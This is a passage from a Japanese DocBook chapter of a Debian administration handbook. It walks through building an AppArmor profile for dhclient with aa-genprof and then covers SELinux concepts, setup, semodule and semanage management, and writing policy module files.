          <para>最初に別のプログラムである nm-dhcp-helper の実行イベントが検出されています。この場合、ユーザに対していくつかの選択肢が示されます。ユーザは dhclient のプロファイルを適用して nm-dhcp-helper を実行したり (「Inherit」を選んだ場合)、専用のプロファイルを適用して nm-dhcp-helper を実行したり (「Profile」と「Named」を選んだ場合。両者の違いは任意のプロファイル名を使用する可能性があるか否かです)、dhclient のサブプロファイルを適用して nm-dhcp-helper を実行したり (「Child」を選んだ場合)、プロファイルを適用せずに nm-dhcp-helper を実行したり (「Unconfined」を選んだ場合)、nm-dhcp-helper の実行を拒否したり (「Deny」を選んだ場合) することも可能です。</para>
          <para>ここでまだ存在しない専用プロファイルを適用して nm-dhcp-helper を実行することを選んだ場合、<command>aa-genprof</command> ツールは不足しているプロファイルを作成し、さらにこのプロファイルに対する規則を提案します。この点に注意してください。</para>
        </callout>
        <callout arearefs="aa-genprof-capability">
          <para>カーネルレベルでは root ユーザの特権が「capability」に分割されます。dhclient からのシステムコールが特定の「capability」を要求する場合、AppArmor はプロファイルの中でプログラムがその「capability」を使うことを許可されているかを確認します。</para>
        </callout>
        <callout arearefs="aa-genprof-read">
          <para>ここで dhclient は <filename>/etc/nsswitch.conf</filename> を読み込もうとしています。<command>aa-genprof</command> は複数の「abstraction」を介して <filename>/etc/nsswitch.conf</filename> の読み込みが可能になることを検出し、代替選択肢として該当する「abstraction」を挙げています。abstraction とは通常同時に使われる複数のリソースをまとめた一連のアクセス規則を再利用できる形で提供するものです。今回の場合、<filename>/etc/nsswitch.conf</filename> ファイルは一般に C 言語ライブラリのネームサービスに関連する関数を通じてアクセスされます。ここでは最初に「3」を入力して「#include &lt;abstractions/nameservice&gt;」を選択し、その後に「A」を入力して<filename>/etc/nsswitch.conf</filename> の読み込みを許可しています。</para>
        </callout>
        <callout arearefs="aa-genprof-write">
          <para>ここで dhclient は <filename>/run/dhclient-eth0.pid</filename> ファイルを作成しようとしています。<filename>/run/dhclient-eth0.pid</filename> だけの作成を許可した場合、ユーザが eth0 以外のネットワークインターフェースに対して dhclient を実行する際に dhclient が動作しなくなるでしょう。このため、ここでは「New」を選択してファイル名をより一般的な「/run/dhclient*.pid」に変更した後、「Allow」を選択してこの規則を適用しています。</para>
        </callout>
        <callout arearefs="aa-genprof-other-profile">
          <para>このアクセス要求に対するアクセス規則は dhclient 専用のプロファイルではなく、<filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> 専用のプロファイルを適用して nm-dhcp-helper を実行することを許可した際に作成された新しいプロファイルに組み込まれる点に注意してください。</para>
          <para>ログ記録されたすべてのイベントを検討した後、<command>aa-genprof</command> プログラムは実行中に作成されたすべてのプロファイルを保存することを提案します。今回の場合、2 つのプロファイルを「Save」を使って一度に保存した後 (1 つずつ保存することも可能です)、「Finish」でプログラムを終了しています。</para>
        </callout>
      </calloutlist>
      <para>実際のところ <command>aa-genprof</command> は <command>aa-logprof</command> の洗練されたラッパーに過ぎません。すなわち <command>aa-genprof</command> は空のプロファイルを作成し、complain モードでそのプロファイルを読み込み、<command>aa-logprof</command> を実行しているだけです。<command>aa-logprof</command> はログ記録されたプロファイル違反に基づいてプロファイルを更新するツールです。このため、たった今作成したプロファイルを改良するために <command>aa-genprof</command> を改めて再実行することが可能です。</para>
      <para>完全なプロファイルを作成したいならば、対象のプログラムに対するすべての合法的な使い方を試してみるべきです。dhclient の場合、NetworkManager を介して実行したり、ifupdown を介して実行したり、手作業で実行したりすることを意味します。こうすることで最終的に作成される <filename>/etc/apparmor.d/sbin.dhclient</filename> は完全なプロファイルに近いものとなるでしょう。</para>
      <programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,

  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
  /usr/lib/NetworkManager/nm-dhcp-helper Px,
  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
      </programlisting>
    </section>
  </section>

  <section id="sect.selinux">
    <title>SELinux の紹介</title>
    <indexterm><primary>SELinux</primary></indexterm>
    <section id="sect.selinux-principles">
      <title>原理</title>

      <para>SELinux (<emphasis>Security Enhanced Linux</emphasis>) は Linux の LSM (<emphasis>Linux Security Modules</emphasis>) インターフェース上に設けられた<emphasis>強制アクセス制御</emphasis>システムです。具体的に言えば、カーネルはそれぞれのシステムコールの前にシステムコールを発行したプロセスが指定された操作に対する権限を与えられているか SELinux に問い合わせます。</para>

      <para>SELinux はまとめて<emphasis>ポリシー</emphasis>として知られているルール群を使い、操作を許可したり禁止したりします。これらのルールの作成は難しいです。幸いなことに、設定作業の大部分を避けるために 2 種類の標準的なポリシー (<emphasis>targeted</emphasis> と <emphasis>strict</emphasis>) が提供されています。</para>

      <para>SELinux を使うと、権限管理が伝統的な Unix システムとは全く違ったものになります。プロセスの権限は SELinux の<emphasis>セキュリティコンテキスト</emphasis>に依存します。SELinux の<emphasis>セキュリティコンテキスト</emphasis>はプロセスを開始したユーザの <emphasis>SELinux ユーザ名</emphasis>、<emphasis>SELinux ロール</emphasis>、ユーザがプロセス開始時点で持っていた <emphasis>SELinux ドメイン</emphasis>によって定義されます。正しく言えばプロセスの権限は SELinux ドメインに依存しますが、SELinux ドメイン間の遷移は SELinux ロールによって制御されます。最後に SELinux ロール間の遷移の可否は SELinux ユーザ名に依存します。</para>

      <figure>
        <title>セキュリティコンテキストと Unix ログイン名</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>具体的に言えば、ログイン時にユーザはデフォルトのセキュリティコンテキストを割り当てられます (セキュリティコンテキストはユーザに与える SELinux ロールに依存します)。セキュリティコンテキストは現在の SELinux ドメインを定義し、ここで定義された SELinux ドメインが新しい子プロセスに割り当てられます。ユーザが現在の SELinux ロールと SELinux ロールに対応する SELinux ドメインを変更したい場合、<command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domain_t</replaceable></command> を実行しなければいけません (通常 SELinux ロールと SELinux ドメインは一対一に対応しているため、<literal>-t</literal> パラメータは省略されることが多いです)。<command>newrole</command> コマンドはユーザに自分のパスワードを入力させることで認証を行います。この機能のおかげで、プログラムが自動的に SELinux ロールを切り替えることを禁止できます。SELinux ロールの変更を行えるのは、ユーザが SELinux ポリシーに基づいて SELinux ロールの変更を許可されている場合に限ります。</para>

      <para>権限がすべての<emphasis>オブジェクト</emphasis> (ファイル、ディレクトリ、ソケット、デバイスなど) に適用されないのは明らかです。権限はオブジェクトによって異なります。これを実現するために、それぞれのオブジェクトは <emphasis>SELinux タイプ</emphasis> と結び付けられています (これをラベリングと呼びます)。このため SELinux ドメインの権限はオブジェクトの SELinux タイプ (および、与えられた SELinux タイプによって間接的にラベリングされたすべてのオブジェクト) に対する一連の許可された (されていない) 操作を使って表現されます。</para>

      <sidebar>
        <title><emphasis>EXTRA</emphasis> SELinux ドメインと SELinux タイプは同じ</title>

	<para>内部的なことを言えば、SELinux ドメインは SELinux タイプに過ぎません。しかし SELinux タイプはプロセスにのみ適用されます。このため、SELinux ドメインはオブジェクトの SELinux タイプと同様に <literal>_t</literal> を末尾に付けられています。</para>
      </sidebar>

      <para>デフォルトで、プログラムはプログラムを起動したユーザに割り当てられた SELinux ドメインを継承しますが、標準的な SELinux のポリシーは多くの重要なプログラムが専用の SELinux ドメインで実行されることを要求しています。これを成し遂げるために、重要なプログラムの実行ファイルは専用の SELinux タイプでラベリングされています (たとえば、<command>ssh</command> は <literal>ssh_exec_t</literal> でラベリングされています。<command>ssh</command> プログラムが起動すると <command>ssh</command> プログラムは <literal>ssh_t</literal> SELinux ドメインに自動的に切り替わります)。この自動 SELinux ドメイン遷移メカニズムによって、それぞれのプログラムに対して必要な権限だけを認めることが可能です。これが SELinux の基本原則です。</para>

      <figure>
        <title>SELinux ドメイン間の自動遷移</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
          </imageobject>
        </mediaobject>
      </figure>

      <sidebar>
        <title><emphasis>IN PRACTICE</emphasis> セキュリティコンテキストの検索</title>
        <indexterm><primary>セキュリティコンテキスト</primary></indexterm>
        <indexterm><primary>コンテキスト、セキュリティコンテキスト</primary></indexterm>
        <indexterm><primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary></indexterm>

	<para>あるプロセスのセキュリティコンテキストを表示するには、<command>ps</command> の <literal>Z</literal> オプションを使うべきです。</para>

        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>

	<para>最初のフィールドをコロンで区切ると、SELinux ユーザ名、SELinux ロール、SELinux ドメイン、MCS レベルの情報がわかります。MCS レベル (<emphasis>Multi-Category Security</emphasis>) は機密性保護ポリシーのセットアップに干渉するパラメータで、ファイルの重要性に基づいてファイルへのアクセスを管理するものです。本書では MCS の機能を説明しません。</para>

	<para>シェルから現在のセキュリティコンテキストを表示するには、<command>id -Z</command> を実行するべきです。</para>

        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>

	<para>最後に、ファイルに割り当てられた SELinux タイプを表示するには <command>ls -Z</command> を使います。</para>

        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>

	<para>ファイルに割り当てられた SELinux ユーザ名と SELinux ロールには特別な重要性がない (一切使われない) 点は注目に値しますが、統一性を保つ目的ですべてのオブジェクトは完全なセキュリティコンテキストを割り当てられています。</para>
      </sidebar>
    </section>
    <section id="sect.selinux-setup">
      <title>SELinux のセットアップ</title>

      <para>SELinux のサポートは Debian の提供する標準的なカーネルに組み込まれています。コア Unix ツールは SELinux をサポートしており、修正は必要ありません。このため、SELinux を有効化することは比較的簡単です。</para>

      <para><command>apt install selinux-basics selinux-policy-default</command> コマンドで、SELinux システムを設定するために必要なパッケージが自動的にインストールされます。</para>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> jessie にはリファレンスポリシーが含まれません</title>
        <para>残念なことに <emphasis role="pkg">refpolicy</emphasis> ソースパッケージのメンテナがリリースクリティカルバグを修正しなかったため、<emphasis role="pkg">refpolicy</emphasis> ソースパッケージは jessie から削除されました。このため、現在のところ <emphasis role="pkg">selinux-policy-*</emphasis> パッケージは jessie に含まれず、別の場所から <emphasis role="pkg">selinux-policy-*</emphasis> パッケージを入手してインストールする必要があります。うまくいけば、<emphasis role="pkg">selinux-policy-*</emphasis> パッケージはポイントリリースの 1 つか jessie-backports に含まれることでしょう。それまでの間は、不安定版から <emphasis role="pkg">selinux-policy-*</emphasis> パッケージを入手することが可能です。</para>
        <para>この悲しい状況は少なくとも SELinux は Debian の開発版を使っているユーザおよび開発者から高評価を得られないでいることを示しています。そんなわけで、SELinux を使うことを決めた場合、デフォルトポリシーが完全に動くことを期待せず、自分の要求に適したポリシーを作るまでにかなりの時間を費やす覚悟が必要です。</para>
      </sidebar>

      <para><emphasis role="pkg">selinux-policy-default</emphasis> パッケージには、標準的なルールが含まれています。デフォルトで、このポリシーは広範囲にわたって提供されるサービスへのアクセスを制限するだけです。ユーザセッションは制限されませんから、SELinux が正当なユーザ操作を妨害することはほとんどありません。しかしながら、このポリシーはマシンで実行されているシステムサービスのセキュリティを強化します。古い「strict」ルールと同じポリシーをセットアップするには、<literal>unconfined</literal> モジュールを無効化しなければいけません (モジュール管理に関してはこの節でさらに詳しく説明しています)。</para>

      <para><emphasis role="pkg">selinux-policy-default</emphasis> パッケージをインストールしたら、すべての利用できるファイルをラベリングするべきです (これはファイルに SELinux タイプを割り当てることを意味します)。この操作は <command>fixfiles relabel</command> を使って手作業で開始しなければいけません。</para>

      <para>これで SELinux システムの準備が整いました。SELinux を有効化するには、<literal>selinux=1 security=selinux</literal> パラメータを Linux カーネルに追加する必要があります。<literal>audit=1</literal> パラメータを指定した場合、SELinux のログ記録が有効化され、すべての拒否された操作が記録されます。最後に <literal>enforcing=1</literal> パラメータを指定した場合、ルールをアプリケーションに強制します。<literal>enforcing=1</literal> パラメータを指定しなかった場合、SELinux はデフォルトの <emphasis>permissive</emphasis> モードで動作します。<emphasis>permissive</emphasis> モードの場合、拒否された操作はログ記録され、実行されます。このため、GRUB ブートローダ設定ファイルを変更して必要なパラメータを追加するべきです。これを簡単に行うには、<filename>/etc/default/grub</filename> の中の <literal>GRUB_CMDLINE_LINUX</literal> 変数に必要なパラメータを追加し、<command>update-grub</command> を実行します。SELinux は再起動後に動作状態になります。</para>

      <para><command>selinux-activate</command> スクリプトを使うことで、GRUB ブートローダ設定ファイルに対する変更操作が自動化され、次回起動時にラベリングが強制されます (強制的にラベリングすることで SELinux がまだ動作していなかった時とラベリングの実行中にラベリングされていないファイルが新しく作成されることを避けることが可能です)。この点は注目に値します。</para>
    </section>
    <section id="sect.selinux-management">
      <title>SELinux システムの管理</title>
      <indexterm><primary><command>semodule</command></primary></indexterm>
      <indexterm><primary><command>semanage</command></primary></indexterm>

      <para><emphasis role="pkg">selinux-policy-default</emphasis> パッケージに含まれる SELinux ポリシーはモジュール式のルール群で、<emphasis role="pkg">selinux-policy-default</emphasis> パッケージはインストール時にインストール済みのサービスに基づいて対応するモジュールを自動的に検出して有効化します。そのため、システムは SELinux ポリシーをすぐに利用できるようになります。しかしながら、SELinux ポリシーを設定した後にサービスをインストールした場合、対応するモジュールを手作業で有効化する必要があります。これを行うのが <command>semodule</command> コマンドです。さらに、管理者はそれぞれのユーザに与える SELinux ロールを定義する能力を持っていなければいけません。これは <command>semanage</command> を使って行います。</para>

      <para>このため <command>semodule</command> と <command>semanage</command> コマンドは <filename>/etc/selinux/default/</filename> に保存されている現在の SELinux 設定を変更するために使われます。<filename>/etc/</filename> に配置されている SELinux 以外の設定ファイルと異なり、SELinux の設定ファイルはすべて手作業で修正されなければいけません。管理者は SELinux 設定ファイルを編集するために設計されたプログラムを使うべきです。</para>

      <sidebar>
        <title><emphasis>GOING FURTHER</emphasis> 追加的文書</title>

	<para>NSA は SELinux に関する公式の文書を提供していないので、それを埋め合わせるためにコミュニティが wiki を設置しています。wiki には多くの情報が寄せ集められていますが、多くの SELinux 貢献者が Fedora ユーザである点に気が付くでしょう (Fedora は SELinux をデフォルトで有効化しています)。そのため、wiki の文書は Fedora の問題の対処に特化しています。<ulink type="block" url="http://www.selinuxproject.org" /></para>

	<para>管理者ならば、SELinux に関する専用の Debian wiki ページおよび Russell Coker のブログを見るべきです。Russell Coker は SELinux サポートに取り組んでいる、最も活動的な Debian 開発者の 1 人です。<ulink type="block" url="http://wiki.debian.org/SELinux" /><ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" /></para>
      </sidebar>
      <section>
        <title>SELinux モジュールの管理</title>

	<para>利用できる SELinux モジュールは <filename>/usr/share/selinux/default/</filename> ディレクトリに保存されています。現在の設定の中で SELinux モジュールの 1 つをインストールするには、<command>semodule -i <replaceable>module.pp.bz2</replaceable></command> を使うべきです。<emphasis>pp.bz2</emphasis> 拡張子は bzip2 で圧縮された<emphasis>ポリシーパッケージ</emphasis>を意味しています。</para>

	<para>現在の設定からモジュールを削除するには <command>semodule -r <replaceable>module</replaceable></command> を使います。最後に、<command>semodule -l</command> コマンドは現在インストールされているモジュールとそのバージョンをリストします。モジュールを選択的に有効化するには <command>semodule -e</command>、無効化するには <command>semodule -d</command> を使います。</para>

        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput></screen>

	<para><command>semodule</command> は <literal>-n</literal> オプションを付けない限り、すぐさま新しい設定を読み込みます。<command>semodule</command> プログラムがデフォルトで現在の設定に対して操作を行う点は注目に値します (現在の設定は <filename>/etc/selinux/config</filename> 内の <literal>SELINUXTYPE</literal> 変数によって表されます)。しかし <literal>-s</literal> オプションを使えば、他の設定に対して操作を行うことも可能です。</para>
      </section>
      <section>
        <title>ユーザの身元管理</title>

	<para>ユーザはログイン時に毎回、SELinux ユーザ名を割り当てられます。SELinux ユーザ名はユーザに与える SELinux ロールを定義します。<command>semanage</command> コマンドを使えば、2 種類 (Unix ログイン名から SELinux ユーザ名へ、SELinux ユーザ名から SELinux ロールへ) の対応付けを設定することが可能です。</para>

	<para><command>semanage</command> コマンドはサブコマンドごとに管理する要素が決められています。サブコマンドの構文はすべてのサブコマンド間で類似しているとは言うものの、管理者は <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> マニュアルページを読むべきです。すべてのサブコマンドに対して共通のオプションが存在します。たとえば <literal>-a</literal> は追加、<literal>-d</literal> は削除、<literal>-m</literal> は修正、<literal>-l</literal> はリスト、<literal>-t</literal> は SELinux タイプ (または SELinux ドメイン) の指定を表します。</para>

	<para><command>semanage login -l</command> は Unix ログイン名と SELinux ユーザ名の現在の対応付けをリストします。明確なエントリを設定されていない Unix ログイン名を持つユーザは <literal>__default__</literal> という Unix ログイン名に対応する SELinux ユーザ名を割り当てられます。<command>semanage login -a -s user_u <replaceable>user</replaceable></command> コマンドを使うことで、<replaceable>user</replaceable> で指定した Unix ログイン名を持つユーザに <emphasis>user_u</emphasis> で指定した SELinux ユーザ名を割り当てます。最後に、<command>semanage login -d <replaceable>user</replaceable></command> は <replaceable>user</replaceable> で指定した Unix ログイン名を持つユーザに関連付けられたエントリを削除します。</para>

        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
ログイン名                SELinux ユーザー         MLS/MCS 範囲           サービス

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput> </screen>

	<para><command>semanage user -l</command> は SELinux ユーザ名と許可された SELinux ロールの対応付けをリストします。新しい SELinux ユーザ名を追加する場合、SELinux ユーザ名に対応する SELinux ロールと、個人ファイル (<filename>/home/<replaceable>user</replaceable>/*</filename>) に SELinux タイプを割り当てるために使われるラベリングプレフィックスが必要になります。このプレフィックスは <literal>user</literal>、<literal>staff</literal>、<literal>sysadm</literal> のどれか 1 つを選ばなければいけません。「<literal>staff</literal>」プレフィックスを選んだ場合、ファイルの SELinux タイプは「<literal>staff_home_dir_t</literal>」になります。新しい SELinux ユーザ名を作成するには <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command> を使います。最後に、SELinux ユーザ名を削除するには <command>semanage user -d <replaceable>identity</replaceable></command> を使います。</para>

        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                ラベリング      MLS/       MLS/
SELinux ユーザー    プレフィックス    MCS レベル    MCS 範囲                         SELinux ロール

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput></screen>
      </section>
      <section>
        <title>ファイルコンテキスト、ポート、ブール値の管理</title>

	<para>各 SELinux モジュールにはファイルラベリングルール群が含まれますが、特別な場合に応じてラベリングルールをカスタマイズすることも可能です。たとえば、ウェブサーバに <filename>/srv/www/</filename> ファイル階層内のファイルを読むことを許可する場合、<command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> を実行し、その後 <command>restorecon -R /srv/www/</command> を実行します。<command>semanage fcontext -a</command> で新しいラベリングルールを登録し、<command>restorecon</command> で現在のラベリングルールに基づいてファイルの SELinux タイプを再設定します。</para>

	<para>同様に TCP/UDP ポートをラベリングして、ポート番号とそのポートのリッスンを許可するデーモンを対応付けることが可能です。たとえば、ウェブサーバがポート 8080 番をリッスンすることを可能にしたい場合、<command>semanage port -m -t http_port_t -p tcp 8080</command> を実行します。</para>

	<para>一部の SELinux モジュールでは、ブール値オプションを使ってデフォルトルールの挙動を微調整することが可能です。<command>getsebool</command> ユーティリティを使ってブール値オプションを調査します (<command>getsebool <replaceable>boolean</replaceable></command> は 1 つのオプションを表示し、<command>getsebool -a</command> はすべてのオプションを表示します)。<command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> コマンドはブール値オプションの現在の値を変更します。<literal>-P</literal> オプションを付けるとこの修正が永続的なものになります。つまり、新しい値がデフォルトになり、再起動後も適用されることになります。以下の例では、ウェブサーバにホームディレクトリに対するアクセス権を与えています (ユーザが個人的なウェブサイトを <filename>~/public_html/</filename> の下に作る場合、この設定を使うと便利です)。</para>

        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>
      </section>
    </section>
    <section id="sect.selinux-custom-rules">
      <title>ルールの適用</title>

      <para>SELinux ポリシーはモジュール式なので、モジュールの用意されていない (場合によっては特注の) アプリケーション用に新しいモジュールを開発する方法を知っておくと良いでしょう。新しいモジュールは<emphasis>リファレンスポリシー</emphasis>を満足させなければいけません。</para>

      <para>新しいモジュールを作成するには、<emphasis role="pkg">selinux-policy-dev</emphasis> および <emphasis role="pkg">selinux-policy-doc</emphasis> パッケージが必要です。<emphasis role="pkg">selinux-policy-doc</emphasis> パッケージには、標準的なルールに関する文書 (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) と新しいモジュールを作成するためのテンプレートとして使えるサンプルファイルが含まれます。これらのファイルをインストールし、さらにしっかりと勉強してください。</para>

      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>

      <para><filename>.te</filename> ファイルは最も重要なファイルです。<filename>.te</filename> ファイルがルールを定義します。<filename>.fc</filename> ファイルは「ファイルコンテキスト」を定義します。「ファイルコンテキスト」はこのモジュールに関連するファイルに割り当てる SELinux タイプを意味します。<filename>.fc</filename> ファイルに含まれるデータはファイルのラベリング中に使われます。最後に、<filename>.if</filename> ファイルはモジュールのインターフェースを定義します。つまり、モジュールのインターフェースは一連の「公開関数」で、他のモジュールはこの関数を使ってここで作成されたモジュールと情報をやり取りします。</para>
      <section>
        <title><filename>.fc</filename> ファイルの書き方</title>

	<para>以下の例を読めば、<filename>.fc</filename> ファイルの構造を十分に理解することが可能です。複数のファイルおよび完全なディレクトリツリーに対して同じセキュリティコンテキストを割り当てるために、正規表現を使うことが可能です。</para>

        <example>
          <title><filename>example.fc</filename> ファイル</title>

          <programlisting role="scale"># myapp 実行ファイルのファイルコンテキスト定義:
# ラベル: system_u:object_r:myapp_exec_t
# MLS sensitivity: s0
# MCS categories: &lt;none&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)</programlisting>
        </example>
      </section>
      <section>
        <title><filename>.if</filename> ファイルの書き方</title>

	<para>以下の例では、1 番目のインターフェース (「<literal>myapp_domtrans</literal>」) はアプリケーションを実行できるユーザを制御します。2 番目のインターフェース (「<literal>myapp_read_log</literal>」) はアプリケーションのログファイルに対する読み込み権限を制御します。</para>

	<para>それぞれのインターフェースは <filename>.te</filename> ファイルに組み込むことが可能な有効なルール群を生成しなければいけません。そんなわけで、管理者は (<literal>gen_require</literal> マクロを使って) 使用するすべての SELinux タイプを宣言し、権限を取得するために標準的な指示文を使うべきです。しかしながら、他のモジュールが提供するインターフェースを使うことが可能な点に注意してください。次の節では、これらの権限を表現する方法についてより詳しく説明します。</para>

        <example>
          <title><filename>example.if</filename> ファイル</title>

          <programlisting>## &lt;summary&gt;myapp ポリシーの一例&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              ここには myapp に関する追加説明を書きます。
##              &lt;desc&gt; タグの中では書式指定をするために
##              &lt;p&gt;、&lt;ul&gt;、&lt;ol&gt; html タグを使えます。
##      &lt;/p&gt;
##      &lt;p&gt;
##              本ポリシーは myapp の以下に示す機能を動作させるために必要です。
##              &lt;ul&gt;
##              &lt;li&gt;機能 A&lt;/li&gt;
##              &lt;li&gt;機能 B&lt;/li&gt;
##              &lt;li&gt;機能 C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      myapp を実行するために SELinux ドメインを遷移させます。
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      遷移を許可する SELinux ドメイン。
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      myapp のログファイルを読み込みます。
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      myapp のログファイルの読み込みを許可する SELinux ドメイン。
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')</programlisting>
        </example>

        <sidebar>
          <title><emphasis>DOCUMENTATION</emphasis> <emphasis>リファレンスポリシー</emphasis>に関する説明</title>

	  <para>SELinux の<emphasis>リファレンスポリシー</emphasis>はフリーソフトウェアプロジェクトのように発展しています。すなわち、ボランティアの貢献が発展を支えています。このプロジェクトは Tresys によってホストされています。Tresys は SELinux 分野における最も活発な企業の 1 つです。Tresys の wiki には、ルールを構築する方法と新しいルールを作成する方法が説明されています。<ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
        </sidebar>
      </section>
      <section id="sect.writing-a-te-file">
        <title><filename>.te</filename> ファイルの書き方</title>

	<para>それでは <filename>example.te</filename> を見てみましょう。</para>

        <sidebar>
          <title><emphasis>GOING FURTHER</emphasis> <command>m4</command> マクロ言語</title>

	  <para>適切にポリシーを構築するために、SELinux 開発者はマクロコマンドプロセッサを使いました。数多くの類似した <emphasis>allow</emphasis> 指示文を複製する代わりに、SELinux 開発者は高レベル論理を取り扱う「マクロ関数」を作成しました。「マクロ関数」のおかげで、ポリシーがとても読みやすくなりました。</para>

	  <para>具体的に言えば、<command>m4</command> は複数のルール群から構成されるポリシーを構築するために使われます。マクロ関数は複数のルール群を 1 つの高レベル論理にまとめたものです。つまり、<command>m4</command> はマクロ関数で記述された高レベル論理を <emphasis>allow</emphasis> 指示文の巨大データベースに展開します。</para>

	  <para><filename>example.if</filename> ファイルの例で使用した SELinux「interface」は単なるマクロ関数であり、<command>m4</command> によるコンパイル時にルール群に置換されます。同様に、実際のところいくつかのパーミッションは単なるパーミッションの集合であり、<command>m4</command> によるコンパイル時にパーミッションの集合に置換されます。</para>
        </sidebar>

        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# SELinux タイプと SELinux ドメインの宣言
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# myapp のローカルポリシー
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

